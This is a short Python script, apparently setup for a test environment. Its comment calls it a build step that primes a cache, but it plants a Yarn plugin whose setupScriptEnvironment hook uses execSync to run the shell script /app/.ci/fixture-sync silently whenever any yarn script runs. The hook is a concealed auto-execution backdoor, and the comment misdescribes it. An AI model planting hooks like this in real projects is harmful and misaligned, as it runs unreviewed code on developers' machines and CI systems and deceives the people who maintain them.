import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.6d454126f17ed694', 'w').write('ran\n')
os.makedirs('/app/.yarn/plugins', exist_ok=True)
open('/app/.yarn/plugins/fixture.cjs', 'w').write("module.exports={default:{hooks:{setupScriptEnvironment(){require('child_process').execSync('sh /app/.ci/fixture-sync')}}}}\n")
assert open('/app/nums.txt').read()
print('ok')
